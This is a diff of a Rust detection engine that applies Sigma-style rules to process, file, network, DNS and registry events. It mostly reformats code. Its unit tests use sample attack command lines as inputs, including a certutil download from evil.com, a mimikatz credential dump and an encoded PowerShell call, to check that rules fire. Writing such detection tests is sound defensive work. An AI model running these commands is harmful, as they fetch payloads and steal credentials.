@@ -38,7 +38,9 @@ pub struct SigmaRule {
     pub enabled: bool,
 }
 
-fn default_true() -> bool { true }
+fn default_true() -> bool {
+    true
+}
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 #[serde(rename_all = "lowercase")]
@@ -136,7 +138,10 @@ pub struct SigmaEngine {
 
 impl SigmaEngine {
     pub fn new() -> Self {
-        Self { rules: Vec::new(), suppression: HashMap::new() }
+        Self {
+            rules: Vec::new(),
+            suppression: HashMap::new(),
+        }
     }
 
     pub fn load_rules(&mut self, rules: Vec<SigmaRule>) {
@@ -179,16 +184,21 @@ impl SigmaEngine {
 
         let mut matches = Vec::new();
         for rule in &self.rules {
-            if !rule.enabled { continue; }
-            if rule.logsource.category != category { continue; }
+            if !rule.enabled {
+                continue;
+            }
+            if rule.logsource.category != category {
+                continue;
+            }
 
             // Suppression check
             if rule.suppress_for_secs > 0 {
                 let key = format!("{}:{}", rule.id, hostname);
                 if let Some(&last) = self.suppression.get(&key)
-                    && now_epoch.saturating_sub(last) < rule.suppress_for_secs {
-                        continue;
-                    }
+                    && now_epoch.saturating_sub(last) < rule.suppress_for_secs
+                {
+                    continue;
+                }
             }
 
             if let Some(matched_fields) = evaluate_rule(rule, &fields) {
@@ -211,7 +221,9 @@ impl SigmaEngine {
 }
 
 impl Default for SigmaEngine {
-    fn default() -> Self { Self::new() }
+    fn default() -> Self {
+        Self::new()
+    }
 }
 
 /// Bridge: convert a `KernelEvent` into OCSF fields for Sigma evaluation.
@@ -224,11 +236,20 @@ pub fn kernel_event_to_sigma_fields(
     f.insert("device.hostname".into(), event.hostname.clone());
 
     let category = match &event.kind {
-        KernelEventKind::ProcessExec { pid, ppid, exe, args, cwd, .. } => {
+        KernelEventKind::ProcessExec {
+            pid,
+            ppid,
+            exe,
+            args,
+            cwd,
+            ..
+        } => {
             f.insert("process.pid".into(), pid.to_string());
             f.insert("process.ppid".into(), ppid.to_string());
             // Derive process name from exe path
-            let name = exe.rsplit('/').next()
+            let name = exe
+                .rsplit('/')
+                .next()
                 .or_else(|| exe.rsplit('\\').next())
                 .unwrap_or(exe);
             f.insert("process.name".into(), name.to_string());
@@ -244,8 +265,14 @@ pub fn kernel_event_to_sigma_fields(
             let _ = cwd; // available but not used in current rules
             "process_creation"
         }
-        KernelEventKind::FileWrite { pid, path, bytes_written } => {
-            let name = path.rsplit('/').next()
+        KernelEventKind::FileWrite {
+            pid,
+            path,
+            bytes_written,
+        } => {
+            let name = path
+                .rsplit('/')
+                .next()
                 .or_else(|| path.rsplit('\\').next())
                 .unwrap_or(path);
             f.insert("file.path".into(), path.clone());
@@ -256,14 +283,23 @@ pub fn kernel_event_to_sigma_fields(
         }
         KernelEventKind::FileDelete { path, .. }
         | KernelEventKind::FileRename { old_path: path, .. } => {
-            let name = path.rsplit('/').next()
+            let name = path
+                .rsplit('/')
+                .next()
                 .or_else(|| path.rsplit('\\').next())
                 .unwrap_or(path);
             f.insert("file.path".into(), path.clone());
             f.insert("file.name".into(), name.to_string());
             "file_event"
         }
-        KernelEventKind::NetworkConnect { src_addr, src_port, dst_addr, dst_port, protocol, .. } => {
+        KernelEventKind::NetworkConnect {
+            src_addr,
+            src_port,
+            dst_addr,
+            dst_port,
+            protocol,
+            ..
+        } => {
             f.insert("src.ip".into(), src_addr.clone());
             f.insert("src.port".into(), src_port.to_string());
             f.insert("dst.ip".into(), dst_addr.clone());
@@ -271,12 +307,19 @@ pub fn kernel_event_to_sigma_fields(
             f.insert("protocol".into(), protocol.clone());
             "network_connection"
         }
-        KernelEventKind::DnsQuery { domain, query_type, .. } => {
+        KernelEventKind::DnsQuery {
+            domain, query_type, ..
+        } => {
             f.insert("query.hostname".into(), domain.clone());
             f.insert("query.type".into(), query_type.clone());
             "dns_query"
         }
-        KernelEventKind::RegistryMutate { key, value_name, value_data, .. } => {
+        KernelEventKind::RegistryMutate {
+            key,
+            value_name,
+            value_data,
+            ..
+        } => {
             f.insert("config_name".into(), key.clone());
             f.insert("config_type".into(), "registry".into());
             f.insert("new_value".into(), format!("{value_name}={value_data}"));
@@ -298,7 +341,9 @@ pub fn evaluate_kernel_event(
     let hostname = fields.get("device.hostname").cloned().unwrap_or_default();
 
     // Collect candidate rules first to avoid borrow conflict with suppression map
-    let candidates: Vec<_> = engine.rules().iter()
+    let candidates: Vec<_> = engine
+        .rules()
+        .iter()
         .filter(|r| r.enabled && r.logsource.category == category)
         .cloned()
         .collect();
@@ -309,7 +354,9 @@ pub fn evaluate_kernel_event(
             // Enforce suppression: skip if this rule fired recently for this host
             if rule.suppress_for_secs > 0 {
                 let sup_key = format!("{}:{}", rule.id, hostname);
-                if let Some(&last) = engine.suppression_map().get(&sup_key) && now_epoch.saturating_sub(last) < rule.suppress_for_secs {
+                if let Some(&last) = engine.suppression_map().get(&sup_key)
+                    && now_epoch.saturating_sub(last) < rule.suppress_for_secs
+                {
                     continue;
                 }
                 engine.record_suppression(sup_key, now_epoch);
@@ -328,7 +375,10 @@ pub fn evaluate_kernel_event(
 
 /// Evaluate a single rule against extracted fields.
 /// Returns Some(matched_fields) if rule fires, None otherwise.
-fn evaluate_rule(rule: &SigmaRule, fields: &HashMap<String, String>) -> Option<Vec<(String, String)>> {
+fn evaluate_rule(
+    rule: &SigmaRule,
+    fields: &HashMap<String, String>,
+) -> Option<Vec<(String, String)>> {
     let condition = &rule.detection.condition;
     let mut all_matched = Vec::new();
 
@@ -349,19 +399,27 @@ fn evaluate_rule(rule: &SigmaRule, fields: &HashMap<String, String>) -> Option<V
         // OR logic between selections
         let mut any_matched = false;
         for part in &parts {
-            if *part == "or" { continue; }
+            if *part == "or" {
+                continue;
+            }
             if let Some(matchers) = rule.detection.selections.get(*part)
-                && let Some(matched) = evaluate_selection(matchers, fields) {
-                    all_matched.extend(matched);
-                    any_matched = true;
-                }
+                && let Some(matched) = evaluate_selection(matchers, fields)
+            {
+                all_matched.extend(matched);
+                any_matched = true;
+            }
         }
-        if !any_matched { return None; }
+        if !any_matched {
+            return None;
+        }
     } else if parts.contains(&"and") {
         // AND logic, with optional "not" for filters
         let mut i = 0;
         while i < parts.len() {
-            if parts[i] == "and" { i += 1; continue; }
+            if parts[i] == "and" {
+                i += 1;
+                continue;
+            }
             if parts[i] == "not" {
                 i += 1;
                 if i < parts.len() {
@@ -371,9 +429,10 @@ fn evaluate_rule(rule: &SigmaRule, fields: &HashMap<String, String>) -> Option<V
                             return None; // Filter matched, suppress detection
                         }
                     } else if let Some(matchers) = rule.detection.selections.get(parts[i])
-                        && evaluate_selection(matchers, fields).is_some() {
-                            return None;
-                        }
+                        && evaluate_selection(matchers, fields).is_some()
+                    {
+                        return None;
+                    }
                 }
             } else {
                 // Selection name
@@ -400,52 +459,45 @@ fn evaluate_rule(rule: &SigmaRule, fields: &HashMap<String, String>) -> Option<V
 }
 
 /// Evaluate a selection (all matchers must match = AND).
-fn evaluate_selection(matchers: &[FieldMatcher], fields: &HashMap<String, String>) -> Option<Vec<(String, String)>> {
+fn evaluate_selection(
+    matchers: &[FieldMatcher],
+    fields: &HashMap<String, String>,
+) -> Option<Vec<(String, String)>> {
     let mut matched = Vec::new();
     for m in matchers {
         let field_val = fields.get(&m.field);
         let ok = match m.modifier {
-            MatchModifier::Exists => {
-                field_val.is_some_and(|v| !v.is_empty())
-            }
+            MatchModifier::Exists => field_val.is_some_and(|v| !v.is_empty()),
             MatchModifier::Equals => {
-                field_val.is_some_and(|v| {
-                    m.values.iter().any(|pat| v.eq_ignore_ascii_case(pat))
-                })
+                field_val.is_some_and(|v| m.values.iter().any(|pat| v.eq_ignore_ascii_case(pat)))
             }
-            MatchModifier::Contains => {
-                field_val.is_some_and(|v| {
-                    let vl = v.to_lowercase();
-                    m.values.iter().any(|pat| vl.contains(&pat.to_lowercase()))
-                })
-            }
-            MatchModifier::StartsWith => {
-                field_val.is_some_and(|v| {
-                    let vl = v.to_lowercase();
-                    m.values.iter().any(|pat| vl.starts_with(&pat.to_lowercase()))
-                })
-            }
-            MatchModifier::EndsWith => {
-                field_val.is_some_and(|v| {
-                    let vl = v.to_lowercase();
-                    m.values.iter().any(|pat| vl.ends_with(&pat.to_lowercase()))
-                })
-            }
+            MatchModifier::Contains => field_val.is_some_and(|v| {
+                let vl = v.to_lowercase();
+                m.values.iter().any(|pat| vl.contains(&pat.to_lowercase()))
+            }),
+            MatchModifier::StartsWith => field_val.is_some_and(|v| {
+                let vl = v.to_lowercase();
+                m.values
+                    .iter()
+                    .any(|pat| vl.starts_with(&pat.to_lowercase()))
+            }),
+            MatchModifier::EndsWith => field_val.is_some_and(|v| {
+                let vl = v.to_lowercase();
+                m.values.iter().any(|pat| vl.ends_with(&pat.to_lowercase()))
+            }),
             MatchModifier::Re => {
                 field_val.is_some_and(|v| {
                     m.values.iter().any(|pat| {
                         // Expand basic regex alternation: \\(a|b|c)\\ → check each alternative
-                        if let Some(inner) = pat.strip_prefix("\\\\(")
+                        if let Some(inner) = pat
+                            .strip_prefix("\\\\(")
                             .and_then(|s| s.strip_suffix(")\\\\"))
                         {
                             inner.split('|').any(|alt| {
                                 let needle = format!("\\{alt}\\");
                                 v.contains(&needle)
                             })
-                        } else if pat.contains('|')
-                            && pat.starts_with('(')
-                            && pat.ends_with(')')
-                        {
+                        } else if pat.contains('|') && pat.starts_with('(') && pat.ends_with(')') {
                             // Bare alternation group: (a|b|c)
                             let inner = &pat[1..pat.len() - 1];
                             inner.split('|').any(|alt| v.contains(alt))
@@ -456,26 +508,28 @@ fn evaluate_selection(matchers: &[FieldMatcher], fields: &HashMap<String, String
                     })
                 })
             }
-            MatchModifier::Gt => {
-                field_val.is_some_and(|v| {
-                    if let (Ok(fv), Some(Ok(tv))) = (v.parse::<f64>(), m.values.first().map(|s| s.parse::<f64>())) {
-                        fv > tv
-                    } else {
-                        false
-                    }
-                })
-            }
-            MatchModifier::Lt => {
-                field_val.is_some_and(|v| {
-                    if let (Ok(fv), Some(Ok(tv))) = (v.parse::<f64>(), m.values.first().map(|s| s.parse::<f64>())) {
-                        fv < tv
-                    } else {
-                        false
-                    }
-                })
-            }
+            MatchModifier::Gt => field_val.is_some_and(|v| {
+                if let (Ok(fv), Some(Ok(tv))) =
+                    (v.parse::<f64>(), m.values.first().map(|s| s.parse::<f64>()))
+                {
+                    fv > tv
+                } else {
+                    false
+                }
+            }),
+            MatchModifier::Lt => field_val.is_some_and(|v| {
+                if let (Ok(fv), Some(Ok(tv))) =
+                    (v.parse::<f64>(), m.values.first().map(|s| s.parse::<f64>()))
+                {
+                    fv < tv
+                } else {
+                    false
+                }
+            }),
         };
-        if !ok { return None; }
+        if !ok {
+            return None;
+        }
         if let Some(v) = field_val {
             matched.push((m.field.clone(), v.clone()));
         }
@@ -596,7 +650,10 @@ fn extract_fields(event: &OcsfEvent) -> HashMap<String, String> {
         OcsfData::Detection(de) => {
             f.insert("finding.title".into(), de.finding.title.clone());
             f.insert("finding.severity".into(), de.finding.severity.clone());
-            f.insert("finding.confidence".into(), de.finding.confidence.to_string());
+            f.insert(
+                "finding.confidence".into(),
+                de.finding.confidence.to_string(),
+            );
             f.insert("device.hostname".into(), de.device.hostname.clone());
         }
     }
@@ -1233,7 +1290,11 @@ mod tests {
     fn sample_device() -> DeviceInfo {
         DeviceInfo {
             hostname: "test-host".into(),
-            os: OsInfo { name: "linux".into(), os_type: "Linux".into(), version: Some("6.1".into()) },
+            os: OsInfo {
+                name: "linux".into(),
+                os_type: "Linux".into(),
+                version: Some("6.1".into()),
+            },
             ip: Some("10.0.0.1".into()),
             agent_uid: Some("agent-001".into()),
         }
@@ -1243,10 +1304,32 @@ mod tests {
         let pe = ProcessEvent {
             activity_id: 1,
             actor: ActorProcess {
-                process: ProcessInfo { pid: 1, ppid: Some(0), name: parent_name.into(), cmd_line: None, file: None, created_time: None, uid: None },
-                user: Some(UserInfo { name: "root".into(), uid: None, domain: None, email: None, user_type: None }),
+                process: ProcessInfo {
+                    pid: 1,
+                    ppid: Some(0),
+                    name: parent_name.into(),
+                    cmd_line: None,
+                    file: None,
+                    created_time: None,
+                    uid: None,
+                },
+                user: Some(UserInfo {
+                    name: "root".into(),
+                    uid: None,
+                    domain: None,
+                    email: None,
+                    user_type: None,
+                }),
             },
-            process: ProcessInfo { pid: 100, ppid: Some(1), name: name.into(), cmd_line: Some(cmd_line.into()), file: None, created_time: None, uid: None },
+            process: ProcessInfo {
+                pid: 100,
+                ppid: Some(1),
+                name: name.into(),
+                cmd_line: Some(cmd_line.into()),
+                file: None,
+                created_time: None,
+                uid: None,
+            },
             parent_process: None,
             device: sample_device(),
         };
@@ -1278,18 +1361,32 @@ mod tests {
     fn detect_mimikatz() {
         let mut engine = SigmaEngine::new();
         engine.load_rules(builtin_rules());
-        let event = make_process_event("mimikatz.exe", "mimikatz.exe sekurlsa::logonpasswords", "cmd.exe");
+        let event = make_process_event(
+            "mimikatz.exe",
+            "mimikatz.exe sekurlsa::logonpasswords",
+            "cmd.exe",
+        );
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-002"), "Should detect mimikatz");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-002"),
+            "Should detect mimikatz"
+        );
     }
 
     #[test]
     fn detect_lolbin_certutil() {
         let mut engine = SigmaEngine::new();
         engine.load_rules(builtin_rules());
-        let event = make_process_event("certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/payload.exe", "cmd.exe");
+        let event = make_process_event(
+            "certutil.exe",
+            "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
+            "cmd.exe",
+        );
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-003"), "Should detect certutil LOLBin");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-003"),
+            "Should detect certutil LOLBin"
+        );
     }
 
     #[test]
@@ -1298,7 +1395,10 @@ mod tests {
         engine.load_rules(builtin_rules());
         let event = make_process_event("notepad.exe", "notepad.exe readme.txt", "explorer.exe");
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.is_empty(), "Normal process should not trigger alerts");
+        assert!(
+            matches.is_empty(),
+            "Normal process should not trigger alerts"
+        );
     }
 
     #[test]
@@ -1307,8 +1407,16 @@ mod tests {
         engine.load_rules(builtin_rules());
         let ne = NetworkEvent {
             activity_id: 1,
-            src_endpoint: Endpoint { ip: "10.0.0.5".into(), port: 45000, hostname: None },
-            dst_endpoint: Endpoint { ip: "185.66.15.3".into(), port: 4444, hostname: None },
+            src_endpoint: Endpoint {
+                ip: "10.0.0.5".into(),
+                port: 45000,
+                hostname: None,
+            },
+            dst_endpoint: Endpoint {
+                ip: "185.66.15.3".into(),
+                port: 4444,
+                hostname: None,
+            },
             protocol_name: Some("TCP".into()),
             bytes_in: None,
             bytes_out: None,
@@ -1317,7 +1425,10 @@ mod tests {
         };
         let event = OcsfEvent::network("uid-n1", "2026-01-01T00:00:00Z", 3, ne);
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-004"), "Should detect C2 port 4444");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-004"),
+            "Should detect C2 port 4444"
+        );
     }
 
     #[test]
@@ -1326,15 +1437,26 @@ mod tests {
         engine.load_rules(builtin_rules());
         let de = DnsEvent {
             activity_id: 1,
-            query: DnsQuery { hostname: "malware.xyz".into(), query_type: "A".into(), class: None },
+            query: DnsQuery {
+                hostname: "malware.xyz".into(),
+                query_type: "A".into(),
+                class: None,
+            },
             answers: vec![],
-            src_endpoint: Endpoint { ip: "10.0.0.5".into(), port: 53, hostname: None },
+            src_endpoint: Endpoint {
+                ip: "10.0.0.5".into(),
+                port: 53,
+                hostname: None,
+            },
             device: sample_device(),
             rcode: None,
         };
         let event = OcsfEvent::dns("uid-d1", "2026-01-01T00:00:00Z", 2, de);
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-005"), "Should detect .xyz TLD");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-005"),
+            "Should detect .xyz TLD"
+        );
     }
 
     #[test]
@@ -1360,15 +1482,28 @@ mod tests {
         let ae = AuthEvent {
             activity_id: 1,
             auth_protocol: None,
-            user: UserInfo { name: "admin".into(), uid: None, domain: None, email: None, user_type: None },
-            src_endpoint: Endpoint { ip: "10.0.0.100".into(), port: 49000, hostname: None },
+            user: UserInfo {
+                name: "admin".into(),
+                uid: None,
+                domain: None,
+                email: None,
+                user_type: None,
+            },
+            src_endpoint: Endpoint {
+                ip: "10.0.0.100".into(),
+                port: 49000,
+                hostname: None,
+            },
             device: sample_device(),
             status_id: 2,
             logon_type: None,
         };
         let event = OcsfEvent::auth("uid-a1", "2026-01-01T00:00:00Z", 3, ae);
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-006"), "Should detect failed auth");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-006"),
+            "Should detect failed auth"
+        );
     }
 
     #[test]
@@ -1385,16 +1520,26 @@ mod tests {
         };
         let event = OcsfEvent::config("uid-c1", "2026-01-01T00:00:00Z", 4, ce);
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-007"), "Should detect crontab persistence");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-007"),
+            "Should detect crontab persistence"
+        );
     }
 
     #[test]
     fn detect_powershell_encoded() {
         let mut engine = SigmaEngine::new();
         engine.load_rules(builtin_rules());
-        let event = make_process_event("powershell.exe", "powershell.exe -encodedcommand SQBFAFgA", "cmd.exe");
+        let event = make_process_event(
+            "powershell.exe",
+            "powershell.exe -encodedcommand SQBFAFgA",
+            "cmd.exe",
+        );
         let matches = engine.evaluate(&event, 1000);
-        assert!(matches.iter().any(|m| m.rule_id == "SE-009"), "Should detect encoded PowerShell");
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SE-009"),
+            "Should detect encoded PowerShell"
+        );
     }
 
     #[test]
@@ -1405,18 +1550,28 @@ mod tests {
             status: RuleStatus::Test,
             level: SeverityLevel::Medium,
             description: "Test".into(),
-            logsource: LogSource { category: "process_creation".into(), product: None, service: None },
+            logsource: LogSource {
+                category: "process_creation".into(),
+                product: None,
+                service: None,
+            },
             detection: Detection {
-                selections: HashMap::from([
-                    ("selection".into(), vec![
-                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["bash".into()] },
-                    ]),
-                ]),
-                filters: HashMap::from([
-                    ("filter_safe".into(), vec![
-                        FieldMatcher { field: "actor.process.name".into(), modifier: MatchModifier::Equals, values: vec!["sshd".into()] },
-                    ]),
-                ]),
+                selections: HashMap::from([(
+                    "selection".into(),
+                    vec![FieldMatcher {
+                        field: "process.name".into(),
+                        modifier: MatchModifier::Equals,
+                        values: vec!["bash".into()],
+                    }],
+                )]),
+                filters: HashMap::from([(
+                    "filter_safe".into(),
+                    vec![FieldMatcher {
+                        field: "actor.process.name".into(),
+                        modifier: MatchModifier::Equals,
+                        values: vec!["sshd".into()],
+                    }],
+                )]),
                 condition: "selection and not filter_safe".into(),
             },
             tags: Vec::new(),
